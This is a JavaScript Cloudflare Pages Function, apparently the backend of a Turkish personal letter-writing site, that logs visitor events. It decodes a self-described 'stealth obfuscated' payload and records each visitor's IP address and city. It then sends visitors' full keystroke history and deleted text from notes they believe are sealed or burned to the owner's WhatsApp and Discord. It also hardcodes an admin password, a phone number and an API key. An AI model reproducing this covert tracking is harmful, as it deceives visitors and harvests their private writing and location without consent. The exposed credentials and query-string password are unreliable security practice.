// Cloudflare Pages Function: /api/flower-logs (GET logs for admin, POST new log event)

async function ensureLogSchema(db) {
  if (!db) return;
  try {
    await db.prepare(
      `CREATE TABLE IF NOT EXISTS activity_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        event_type TEXT NOT NULL,
        data_json TEXT NOT NULL,
        created_at TEXT NOT NULL
      )`
    ).run();
  } catch (e) {}
}

export async function onRequestGet(context) {
  const { request, env } = context;
  const url = new URL(request.url);
  const adminPassword = url.searchParams.get('adminPassword');
  const expectedAdminPass = env.ADMIN_PASSWORD || 'Doxish44_';

  if (!adminPassword || adminPassword !== expectedAdminPass) {
    return new Response(JSON.stringify({ error: 'Yetki hatası' }), { status: 403 });
  }

  if (env.DB) {
    try {
      await ensureLogSchema(env.DB);
      const { results } = await env.DB.prepare(
        'SELECT * FROM activity_logs ORDER BY id DESC LIMIT 500'
      ).all();

      const formattedLogs = (results || []).map((row) => ({
        id: row.id,
        eventType: row.event_type,
        data: JSON.parse(row.data_json || '{}'),
        createdAt: row.created_at
      }));

      return new Response(JSON.stringify(formattedLogs), {
        headers: { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' }
      });
    } catch (err) {}
  }

  return new Response(JSON.stringify([]), {
    headers: { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' }
  });
}

import { sendDiscordWebhook } from './_discord.js';

export async function onRequestPost(context) {
  const { request, env } = context;

  try {
    let body = await request.json();

    // Decode Stealth Obfuscated Payload
    if (body && body._v) {
      try {
        const decodedStr = decodeURIComponent(atob(body._v));
        body = JSON.parse(decodedStr);
      } catch (e) {}
    }

    const eventType = body.eventType || 'general_event';
    const data = body.data || {};
    const timestamp = body.timestamp || new Date().toISOString();

    // Extract real client IP and Cloudflare geo metadata
    const clientIp = request.headers.get('cf-connecting-ip') || request.headers.get('x-real-ip') || 'Bilinmiyor';
    const userAgent = request.headers.get('user-agent') || '';
    const city = request.headers.get('cf-ipcity') || (request.cf && request.cf.city) || '';
    const country = request.headers.get('cf-ipcountry') || (request.cf && request.cf.country) || '';

    const enrichedData = {
      ...data,
      ip: clientIp,
      location: city && country ? `${city}, ${country}` : country || city || null,
      userAgent: data.userAgent || userAgent
    };

    // Ignore excluded / developer device IDs (Zero notifications for dev_m2troqnl9_mswunr9c)
    const IGNORED_DEVICE_IDS = ['dev_m2troqnl9_mswunr9c'];
    const clientDevId = String(data.deviceId || enrichedData.deviceId || '').trim();
    if (clientDevId && IGNORED_DEVICE_IDS.includes(clientDevId)) {
      return new Response(JSON.stringify({ success: true, ignored: true }), {
        headers: { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' }
      });
    }

    if (env.DB) {
      await ensureLogSchema(env.DB);
      await env.DB.prepare(
        'INSERT INTO activity_logs (event_type, data_json, created_at) VALUES (?, ?, ?)'
      )
        .bind(eventType, JSON.stringify(enrichedData), timestamp)
        .run();
    }

    // Send Discord / BotGhost Webhook notification
    try {
      await sendDiscordWebhook(env, eventType, enrichedData, timestamp);
    } catch (e) {}

    // Send Real-Time WhatsApp Notification (CallMeBot Integration)
    try {
      await sendWhatsAppNotification(eventType, enrichedData);
    } catch (e) {}

    return new Response(JSON.stringify({ success: true }), {
      headers: { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' }
    });
  } catch (err) {
    return new Response(JSON.stringify({ error: err.message }), { status: 500 });
  }
}

async function sendWhatsAppNotification(eventType, data = {}) {
  try {
    const PHONE = '+905418445100';
    const API_KEY = '5815335';

    // Filter out minor events so WhatsApp is not spammed with every scroll step
    let msg = '';

    if (eventType === 'last_note_locked') {
      msg = `🔒 *Neyse Mektubu Mühürlendi!*\n\n` +
            `📝 *Yazılan Not:* "${data.noteText || data.note || '-'}"\n` +
            `⌨️ *Klavye Geçmişi:* "${data.allTypedHistory || '-'}"\n` +
            `✂️ *Silinen Parçalar:* "${data.deletedText || '-'}"\n` +
            `📅 *Açılacağı Tarih:* ${data.targetDate || '-'}\n` +
            `🔑 *Kilit Kodu:* ${data.sha256Code || '-'}\n` +
            `📱 *Cihaz:* ${data.device || '-'}\n` +
            `⏱️ *Tıklama Süresi:* ${data.buttonClickTime || '-'}`;
    } else if (eventType === 'last_letter_burned') {
      msg = `🔥 *Neyse Mektubu YAKILDI!*\n\n` +
            `⚠️ *Durum:* Ziyaretçi mektubu yakmayı kabul etti.\n` +
            `📱 *Cihaz:* ${data.device || '-'}\n` +
            `⏱️ *Tıklama Süresi:* ${data.buttonClickTime || '-'}`;
    } else if (eventType === 'last_burn_modal_choice') {
      msg = `🔥 *Mektup Yakma Kararı Yapıldı*\n\n` +
            `👉 *Karar:* ${data.choice || '-'}\n` +
            `📱 *Cihaz:* ${data.device || '-'}`;
    } else if (eventType === 'last_burn_modal_opened') {
      msg = `🔥 *Mektup Yakma Butonuna Basıldı*\n\n` +
            `👉 Ziyaretçi "Mektubu Yak" butonuna bastı.\n` +
            `📱 *Cihaz:* ${data.device || '-'}`;
    } else if (eventType === 'last_lock_clicked') {
      msg = `🔒 *Mektubu Sakla Butonuna Basıldı*\n\n` +
            `👉 Ziyaretçi mektup saklama formunu açtı.\n` +
            `📱 *Cihaz:* ${data.device || '-'}`;
    } else if (eventType === 'letter_submitted') {
      msg = `✉️ *Yeni Mektup / Not Gönderildi!*\n\n` +
            `📝 *Metin:* "${data.text || data.letterText || '-'}"\n` +
            `👤 *Gönderen:* ${data.author || 'Anonim'}\n` +
            `📱 *Cihaz:* ${data.device || '-'}`;
    } else if (eventType === 'sut_corbasi_unlocked') {
      msg = `🍲 *Süt Çorbası Şifresi Çözüldü!*\n\n` +
            `🎉 Ziyaretçi "Süt Çorbası" yazarak Ayşenur mektubunun kilidini açtı!\n` +
            `📱 *Cihaz:* ${data.device || '-'}`;
    } else {
      return; // Skip minor events
    }

    const encodedText = encodeURIComponent(msg);
    const url = `https://api.callmebot.com/whatsapp.php?phone=${encodeURIComponent(PHONE)}&text=${encodedText}&apikey=${API_KEY}`;
    
    await fetch(url);
  } catch (e) {}
}
